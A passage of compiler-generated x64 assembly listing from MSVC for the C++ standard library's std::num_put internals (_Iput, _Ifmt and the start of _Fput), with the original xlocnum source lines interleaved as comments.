	lea	rdx, QWORD PTR $T13[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb

; 1557 :             _Dest      = _Rep(_Dest, _Fill, _Fillcount);

	lea	rax, QWORD PTR $T7[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR _Fillcount$[rsp]
	mov	QWORD PTR [rsp+32], rax
	movzx	r9d, BYTE PTR _Fill$[rsp]
	lea	r8, QWORD PTR $T7[rsp]
	lea	rdx, QWORD PTR $T14[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Rep
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb

; 1558 :             _Fillcount = 0;

	mov	QWORD PTR _Fillcount$[rsp], 0

; 1559 :         } else {

	jmp	SHORT $LN12@Iput
$LN13@Iput:

; 1560 :             _Dest = _Put(_Dest, &_Groupstring[0], _Prefix);

	xor	edx, edx
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	lea	rcx, QWORD PTR $T8[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR _Prefix$[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, rax
	lea	r8, QWORD PTR $T8[rsp]
	lea	rdx, QWORD PTR $T15[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb
$LN12@Iput:

; 1561 :         }
; 1562 : 
; 1563 :         _Dest = _Put(_Dest, &_Groupstring[_Prefix], _Count - _Prefix);

	mov	rax, QWORD PTR _Prefix$[rsp]
	mov	rcx, QWORD PTR _Count$[rsp]
	sub	rcx, rax
	mov	rax, rcx
	mov	QWORD PTR tv244[rsp], rax
	mov	rdx, QWORD PTR _Prefix$[rsp]
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	lea	rcx, QWORD PTR $T9[rsp]
	mov	rdi, rcx
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rcx, QWORD PTR tv244[rsp]
	mov	QWORD PTR [rsp+32], rcx
	mov	r9, rax
	lea	r8, QWORD PTR $T9[rsp]
	lea	rdx, QWORD PTR $T16[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Put@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@PEBD_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Put
	mov	rdi, QWORD PTR _Dest$[rsp]
	mov	rsi, rax
	mov	ecx, 16
	rep movsb

; 1564 :         _Iosbase.width(0);

	xor	edx, edx
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?width@ios_base@std@@QEAA_J_J@Z		; std::ios_base::width

; 1565 :         return _Rep(_Dest, _Fill, _Fillcount); // put trailing fill

	lea	rax, QWORD PTR $T10[rsp]
	mov	rdi, rax
	mov	rsi, QWORD PTR _Dest$[rsp]
	mov	ecx, 16
	rep movsb
	mov	rax, QWORD PTR _Fillcount$[rsp]
	mov	QWORD PTR [rsp+32], rax
	movzx	r9d, BYTE PTR _Fill$[rsp]
	lea	r8, QWORD PTR $T10[rsp]
	mov	rdx, QWORD PTR __$ReturnUdt$[rsp]
	mov	rcx, QWORD PTR this$[rsp]
	call	?_Rep@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@D_K@Z ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Rep
	npad	1
	lea	rcx, QWORD PTR _Grouping$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	mov	rax, QWORD PTR __$ReturnUdt$[rsp]

; 1566 :     }

	mov	rcx, QWORD PTR __$ArrayPad$[rsp]
	xor	rcx, rsp
	call	__security_check_cookie
	add	rsp, 488				; 000001e8H
	pop	rdi
	pop	rsi
	ret	0
?_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput
_TEXT	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Kseparator$1 = 48
_Prefix$ = 56
_Pg$ = 64
_Adjustfield$ = 72
_Fillcount$ = 80
tv69 = 88
_Punct_fac$ = 96
tv268 = 104
tv261 = 112
_Ctype_fac$ = 120
tv131 = 128
tv264 = 136
tv244 = 144
$T2 = 152
$T3 = 168
$T4 = 192
$T5 = 208
$T6 = 224
$T7 = 240
$T8 = 256
$T9 = 272
$T10 = 288
$T11 = 304
$T12 = 320
$T13 = 336
$T14 = 352
$T15 = 368
$T16 = 384
_Groupstring$ = 400
_Grouping$ = 432
__$ArrayPad$ = 464
this$ = 512
__$ReturnUdt$ = 520
_Dest$ = 528
_Iosbase$ = 536
_Fill$ = 544
_Buf$ = 552
_Count$ = 560
?dtor$0@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput'::`1'::dtor$0
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T2[rbp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$0@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput'::`1'::dtor$0
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Kseparator$1 = 48
_Prefix$ = 56
_Pg$ = 64
_Adjustfield$ = 72
_Fillcount$ = 80
tv69 = 88
_Punct_fac$ = 96
tv268 = 104
tv261 = 112
_Ctype_fac$ = 120
tv131 = 128
tv264 = 136
tv244 = 144
$T2 = 152
$T3 = 168
$T4 = 192
$T5 = 208
$T6 = 224
$T7 = 240
$T8 = 256
$T9 = 272
$T10 = 288
$T11 = 304
$T12 = 320
$T13 = 336
$T14 = 352
$T15 = 368
$T16 = 384
_Groupstring$ = 400
_Grouping$ = 432
__$ArrayPad$ = 464
this$ = 512
__$ReturnUdt$ = 520
_Dest$ = 528
_Iosbase$ = 536
_Fill$ = 544
_Buf$ = 552
_Count$ = 560
?dtor$1@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput'::`1'::dtor$1
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Groupstring$[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$1@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput'::`1'::dtor$1
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Kseparator$1 = 48
_Prefix$ = 56
_Pg$ = 64
_Adjustfield$ = 72
_Fillcount$ = 80
tv69 = 88
_Punct_fac$ = 96
tv268 = 104
tv261 = 112
_Ctype_fac$ = 120
tv131 = 128
tv264 = 136
tv244 = 144
$T2 = 152
$T3 = 168
$T4 = 192
$T5 = 208
$T6 = 224
$T7 = 240
$T8 = 256
$T9 = 272
$T10 = 288
$T11 = 304
$T12 = 320
$T13 = 336
$T14 = 352
$T15 = 368
$T16 = 384
_Groupstring$ = 400
_Grouping$ = 432
__$ArrayPad$ = 464
this$ = 512
__$ReturnUdt$ = 520
_Dest$ = 528
_Iosbase$ = 536
_Fill$ = 544
_Buf$ = 552
_Count$ = 560
?dtor$2@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput'::`1'::dtor$2
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR $T3[rbp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$2@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput'::`1'::dtor$2
text$x	ENDS
; Function compile flags: /Odtp
;	COMDAT text$x
text$x	SEGMENT
_Kseparator$1 = 48
_Prefix$ = 56
_Pg$ = 64
_Adjustfield$ = 72
_Fillcount$ = 80
tv69 = 88
_Punct_fac$ = 96
tv268 = 104
tv261 = 112
_Ctype_fac$ = 120
tv131 = 128
tv264 = 136
tv244 = 144
$T2 = 152
$T3 = 168
$T4 = 192
$T5 = 208
$T6 = 224
$T7 = 240
$T8 = 256
$T9 = 272
$T10 = 288
$T11 = 304
$T12 = 320
$T13 = 336
$T14 = 352
$T15 = 368
$T16 = 384
_Groupstring$ = 400
_Grouping$ = 432
__$ArrayPad$ = 464
this$ = 512
__$ReturnUdt$ = 520
_Dest$ = 528
_Iosbase$ = 536
_Fill$ = 544
_Buf$ = 552
_Count$ = 560
?dtor$3@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA PROC ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput'::`1'::dtor$3
	push	rbp
	sub	rsp, 32					; 00000020H
	mov	rbp, rdx
	lea	rcx, QWORD PTR _Grouping$[rbp]
	call	??1?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@XZ ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::~basic_string<char,std::char_traits<char>,std::allocator<char> >
	add	rsp, 32					; 00000020H
	pop	rbp
	ret	0
?dtor$3@?0??_Iput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEAD_K@Z@4HA ENDP ; `std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Iput'::`1'::dtor$3
text$x	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?_Ifmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADPEBDH@Z
_TEXT	SEGMENT
tv89 = 0
tv90 = 1
tv91 = 2
_Basefield$ = 4
_Ptr$ = 8
this$ = 32
_Fmt$ = 40
_Spec$ = 48
_Flags$ = 56
?_Ifmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADPEBDH@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ifmt, COMDAT

; 1485 :         char* _Fmt, const char* _Spec, ios_base::fmtflags _Flags) const { // generate sprintf format for integer

$LN13:
	mov	DWORD PTR [rsp+32], r9d
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	sub	rsp, 24

; 1486 :         char* _Ptr = _Fmt;

	mov	rax, QWORD PTR _Fmt$[rsp]
	mov	QWORD PTR _Ptr$[rsp], rax

; 1487 :         *_Ptr++    = '%';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 37			; 00000025H
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax

; 1488 : 
; 1489 :         if (_Flags & ios_base::showpos) {

	mov	eax, DWORD PTR _Flags$[rsp]
	and	eax, 32					; 00000020H
	test	eax, eax
	je	SHORT $LN2@Ifmt

; 1490 :             *_Ptr++ = '+';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 43			; 0000002bH
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax
$LN2@Ifmt:

; 1491 :         }
; 1492 : 
; 1493 :         if (_Flags & ios_base::showbase) {

	mov	eax, DWORD PTR _Flags$[rsp]
	and	eax, 8
	test	eax, eax
	je	SHORT $LN3@Ifmt

; 1494 :             *_Ptr++ = '#';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 35			; 00000023H
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax
$LN3@Ifmt:

; 1495 :         }
; 1496 : 
; 1497 :         if (_Spec[0] != 'L') {

	mov	eax, 1
	imul	rax, rax, 0
	mov	rcx, QWORD PTR _Spec$[rsp]
	movsx	eax, BYTE PTR [rcx+rax]
	cmp	eax, 76					; 0000004cH
	je	SHORT $LN4@Ifmt

; 1498 :             *_Ptr++ = _Spec[0]; // qualifier

	mov	eax, 1
	imul	rax, rax, 0
	mov	rcx, QWORD PTR _Ptr$[rsp]
	mov	rdx, QWORD PTR _Spec$[rsp]
	movzx	eax, BYTE PTR [rdx+rax]
	mov	BYTE PTR [rcx], al
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax

; 1499 :         } else { // change L to I64

	jmp	SHORT $LN5@Ifmt
$LN4@Ifmt:

; 1500 :             *_Ptr++ = 'I';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 73			; 00000049H
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax

; 1501 :             *_Ptr++ = '6';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 54			; 00000036H
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax

; 1502 :             *_Ptr++ = '4';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 52			; 00000034H
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax
$LN5@Ifmt:

; 1503 :         }
; 1504 : 
; 1505 :         ios_base::fmtflags _Basefield = _Flags & ios_base::basefield;

	mov	eax, DWORD PTR _Flags$[rsp]
	and	eax, 3584				; 00000e00H
	mov	DWORD PTR _Basefield$[rsp], eax

; 1506 :         *_Ptr++                       = _Basefield == ios_base::oct  ? 'o'

	cmp	DWORD PTR _Basefield$[rsp], 1024	; 00000400H
	jne	SHORT $LN11@Ifmt
	mov	BYTE PTR tv91[rsp], 111			; 0000006fH
	jmp	SHORT $LN12@Ifmt
$LN11@Ifmt:
	cmp	DWORD PTR _Basefield$[rsp], 2048	; 00000800H
	je	SHORT $LN9@Ifmt
	mov	eax, 1
	imul	rax, rax, 1
	mov	rcx, QWORD PTR _Spec$[rsp]
	movzx	eax, BYTE PTR [rcx+rax]
	mov	BYTE PTR tv90[rsp], al
	jmp	SHORT $LN10@Ifmt
$LN9@Ifmt:
	mov	eax, DWORD PTR _Flags$[rsp]
	and	eax, 4
	test	eax, eax
	je	SHORT $LN7@Ifmt
	mov	BYTE PTR tv89[rsp], 88			; 00000058H
	jmp	SHORT $LN8@Ifmt
$LN7@Ifmt:
	mov	BYTE PTR tv89[rsp], 120			; 00000078H
$LN8@Ifmt:
	movzx	eax, BYTE PTR tv89[rsp]
	mov	BYTE PTR tv90[rsp], al
$LN10@Ifmt:
	movzx	eax, BYTE PTR tv90[rsp]
	mov	BYTE PTR tv91[rsp], al
$LN12@Ifmt:
	mov	rax, QWORD PTR _Ptr$[rsp]
	movzx	ecx, BYTE PTR tv91[rsp]
	mov	BYTE PTR [rax], cl
	mov	rax, QWORD PTR _Ptr$[rsp]
	inc	rax
	mov	QWORD PTR _Ptr$[rsp], rax

; 1507 :                                       : _Basefield != ios_base::hex  ? _Spec[1] // 'd' or 'u'
; 1508 :                                       : _Flags & ios_base::uppercase ? 'X'
; 1509 :                                                                      : 'x';
; 1510 :         *_Ptr                         = '\0';

	mov	rax, QWORD PTR _Ptr$[rsp]
	mov	BYTE PTR [rax], 0

; 1511 :         return _Fmt;

	mov	rax, QWORD PTR _Fmt$[rsp]

; 1512 :     }

	add	rsp, 24
	ret	0
?_Ifmt@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBAPEADPEADPEBDH@Z ENDP ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Ifmt
_TEXT	ENDS
; Function compile flags: /Odtp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.33.31629\include\xlocnum
;	COMDAT ?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z
_TEXT	SEGMENT
tv242 = 48
_Kseparator$ = 49
_Prefix$ = 56
_Dp$ = 64
_Adjustfield$ = 68
_Pg$ = 72
_Fillcount$ = 80
_Poff$ = 88
_Off$ = 96
_Punct_fac$ = 104
tv69 = 112
_Exps$ = 120
tv188 = 128
tv297 = 136
tv290 = 144
_Ctype_fac$ = 152
tv156 = 160
tv293 = 168
_Eoff$ = 176
tv273 = 184
$T1 = 192
$T2 = 208
$T3 = 224
$T4 = 240
$T5 = 256
$T6 = 272
$T7 = 288
$T8 = 304
$T9 = 320
$T10 = 336
$T11 = 352
$T12 = 368
$T13 = 384
$T14 = 400
$T15 = 416
_Groupstring$ = 432
_Grouping$ = 464
__$ArrayPad$ = 496
this$ = 544
__$ReturnUdt$ = 552
_Dest$ = 560
_Iosbase$ = 568
_Fill$ = 576
_Buf$ = 584
_Count$ = 592
?_Fput@?$num_put@DV?$ostreambuf_iterator@DU?$char_traits@D@std@@@std@@@std@@AEBA?AV?$ostreambuf_iterator@DU?$char_traits@D@std@@@2@V32@AEAVios_base@2@DPEBD_K@Z PROC ; std::num_put<char,std::ostreambuf_iterator<char,std::char_traits<char> > >::_Fput, COMDAT

; 1418 :         size_t _Count) const { // put formatted floating-point to _Dest

$LN27:
	mov	QWORD PTR [rsp+32], r9
	mov	QWORD PTR [rsp+24], r8
	mov	QWORD PTR [rsp+16], rdx
	mov	QWORD PTR [rsp+8], rcx
	push	rsi
	push	rdi
	sub	rsp, 520				; 00000208H
	mov	rax, QWORD PTR __security_cookie
	xor	rax, rsp
	mov	QWORD PTR __$ArrayPad$[rsp], rax

; 1419 :         auto _Prefix = static_cast<size_t>(0 < _Count && (*_Buf == '+' || *_Buf == '-'));

	cmp	QWORD PTR _Count$[rsp], 0
	jbe	SHORT $LN19@Fput
	mov	rax, QWORD PTR _Buf$[rsp]
	movsx	eax, BYTE PTR [rax]
	cmp	eax, 43					; 0000002bH
	je	SHORT $LN18@Fput
	mov	rax, QWORD PTR _Buf$[rsp]
	movsx	eax, BYTE PTR [rax]
	cmp	eax, 45					; 0000002dH
	jne	SHORT $LN19@Fput
$LN18@Fput:
	mov	QWORD PTR tv69[rsp], 1
	jmp	SHORT $LN20@Fput
$LN19@Fput:
	mov	QWORD PTR tv69[rsp], 0
$LN20@Fput:
	mov	rax, QWORD PTR tv69[rsp]
	mov	QWORD PTR _Prefix$[rsp], rax

; 1420 :         const char* _Exps;
; 1421 :         if ((_Iosbase.flags() & ios_base::floatfield) != ios_base::hexfloat) {

	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?flags@ios_base@std@@QEBAHXZ		; std::ios_base::flags
	and	eax, 12288				; 00003000H
	cmp	eax, 12288				; 00003000H
	je	SHORT $LN4@Fput

; 1422 :             _Exps = "eE";

	lea	rax, OFFSET FLAT:??_C@_02MDKMJEGG@eE@
	mov	QWORD PTR _Exps$[rsp], rax

; 1423 :         } else { // correct for hexadecimal floating-point

	jmp	$LN5@Fput
$LN4@Fput:

; 1424 :             _Exps = "pP";

	lea	rax, OFFSET FLAT:??_C@_02OOPEBDOJ@pP@
	mov	QWORD PTR _Exps$[rsp], rax

; 1425 :             if (_Prefix + 2 <= _Count && _Buf[_Prefix] == '0'
; 1426 :                 && (_Buf[_Prefix + 1] == 'x' || _Buf[_Prefix + 1] == 'X')) {

	mov	rax, QWORD PTR _Prefix$[rsp]
	add	rax, 2
	cmp	rax, QWORD PTR _Count$[rsp]
	ja	SHORT $LN5@Fput
	mov	rax, QWORD PTR _Prefix$[rsp]
	mov	rcx, QWORD PTR _Buf$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax]
	cmp	eax, 48					; 00000030H
	jne	SHORT $LN5@Fput
	mov	rax, QWORD PTR _Prefix$[rsp]
	mov	rcx, QWORD PTR _Buf$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax+1]
	cmp	eax, 120				; 00000078H
	je	SHORT $LN7@Fput
	mov	rax, QWORD PTR _Prefix$[rsp]
	mov	rcx, QWORD PTR _Buf$[rsp]
	add	rcx, rax
	mov	rax, rcx
	movsx	eax, BYTE PTR [rax+1]
	cmp	eax, 88					; 00000058H
	jne	SHORT $LN5@Fput
$LN7@Fput:

; 1427 :                 _Prefix += 2;

	mov	rax, QWORD PTR _Prefix$[rsp]
	add	rax, 2
	mov	QWORD PTR _Prefix$[rsp], rax
$LN5@Fput:

; 1428 :             }
; 1429 :         }
; 1430 :         const size_t _Eoff = _CSTD strcspn(&_Buf[0], _Exps); // find exponent

	mov	eax, 1
	imul	rax, rax, 0
	mov	rcx, QWORD PTR _Buf$[rsp]
	add	rcx, rax
	mov	rax, rcx
	mov	rdx, QWORD PTR _Exps$[rsp]
	mov	rcx, rax
	call	strcspn
	mov	QWORD PTR _Eoff$[rsp], rax

; 1431 :         char _Dp[2]        = {"."};

	movzx	eax, WORD PTR ??_C@_01LFCBOECM@?4@
	mov	WORD PTR _Dp$[rsp], ax

; 1432 :         _Dp[0]             = _CSTD localeconv()->decimal_point[0];

	call	localeconv
	mov	ecx, 1
	imul	rcx, rcx, 0
	mov	rax, QWORD PTR [rax]
	mov	edx, 1
	imul	rdx, rdx, 0
	movzx	eax, BYTE PTR [rcx+rax]
	mov	BYTE PTR _Dp$[rsp+rdx], al

; 1433 :         const size_t _Poff = _CSTD strcspn(&_Buf[0], &_Dp[0]); // find decimal point

	mov	eax, 1
	imul	rax, rax, 0
	lea	rax, QWORD PTR _Dp$[rsp+rax]
	mov	ecx, 1
	imul	rcx, rcx, 0
	mov	rdx, QWORD PTR _Buf$[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	mov	rdx, rax
	call	strcspn
	mov	QWORD PTR _Poff$[rsp], rax

; 1434 : 
; 1435 :         const ctype<_Elem>& _Ctype_fac = _STD use_facet<ctype<_Elem>>(_Iosbase.getloc());

	lea	rdx, QWORD PTR $T1[rsp]
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?getloc@ios_base@std@@QEBA?AVlocale@2@XZ ; std::ios_base::getloc
	mov	QWORD PTR tv297[rsp], rax
	mov	rax, QWORD PTR tv297[rsp]
	mov	QWORD PTR tv290[rsp], rax
	mov	rcx, QWORD PTR tv290[rsp]
	call	??$use_facet@V?$ctype@D@std@@@std@@YAAEBV?$ctype@D@0@AEBVlocale@0@@Z ; std::use_facet<std::ctype<char> >
	mov	QWORD PTR _Ctype_fac$[rsp], rax
	lea	rcx, QWORD PTR $T1[rsp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale

; 1436 :         basic_string<_Elem> _Groupstring(_Count, _Elem(0)); // reserve space

	xor	r8d, r8d
	mov	rdx, QWORD PTR _Count$[rsp]
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??0?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAA@_KD@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::basic_string<char,std::char_traits<char>,std::allocator<char> >
	npad	1

; 1437 :         _Ctype_fac.widen(_Buf, _Buf + _Count, &_Groupstring[0]);

	xor	edx, edx
	lea	rcx, QWORD PTR _Groupstring$[rsp]
	call	??A?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@std@@QEAAAEAD_K@Z ; std::basic_string<char,std::char_traits<char>,std::allocator<char> >::operator[]
	mov	rcx, QWORD PTR _Count$[rsp]
	mov	rdx, QWORD PTR _Buf$[rsp]
	add	rdx, rcx
	mov	rcx, rdx
	mov	r9, rax
	mov	r8, rcx
	mov	rdx, QWORD PTR _Buf$[rsp]
	mov	rcx, QWORD PTR _Ctype_fac$[rsp]
	call	?widen@?$ctype@D@std@@QEBAPEBDPEBD0PEAD@Z ; std::ctype<char>::widen

; 1438 : 
; 1439 :         const auto& _Punct_fac  = _STD use_facet<numpunct<_Elem>>(_Iosbase.getloc());

	lea	rdx, QWORD PTR $T2[rsp]
	mov	rcx, QWORD PTR _Iosbase$[rsp]
	call	?getloc@ios_base@std@@QEBA?AVlocale@2@XZ ; std::ios_base::getloc
	mov	QWORD PTR tv156[rsp], rax
	mov	rax, QWORD PTR tv156[rsp]
	mov	QWORD PTR tv293[rsp], rax
	mov	rcx, QWORD PTR tv293[rsp]
	call	??$use_facet@V?$numpunct@D@std@@@std@@YAAEBV?$numpunct@D@0@AEBVlocale@0@@Z ; std::use_facet<std::numpunct<char> >
	mov	QWORD PTR _Punct_fac$[rsp], rax
	lea	rcx, QWORD PTR $T2[rsp]
	call	??1locale@std@@QEAA@XZ			; std::locale::~locale

; 1440 :         const string _Grouping  = _Punct_fac.grouping();

	lea	rdx, QWORD PTR _Grouping$[rsp]
	mov	rcx, QWORD PTR _Punct_fac$[rsp]
	call	?grouping@?$numpunct@D@std@@QEBA?AV?$basic_string@DU?$char_traits@D@std@@V?$allocator@D@2@@2@XZ ; std::numpunct<char>::grouping
	npad	1

; 1441 :         const _Elem _Kseparator = _Punct_fac.thousands_sep();

	mov	rcx, QWORD PTR _Punct_fac$[rsp]
	call	?thousands_sep@?$numpunct@D@std@@QEBADXZ ; std::numpunct<char>::thousands_sep
	mov	BYTE PTR _Kseparator$[rsp], al

; 1442 : 
; 1443 :         if (_Poff != _Count) {

	mov	rax, QWORD PTR _Count$[rsp]
	cmp	QWORD PTR _Poff$[rsp], rax
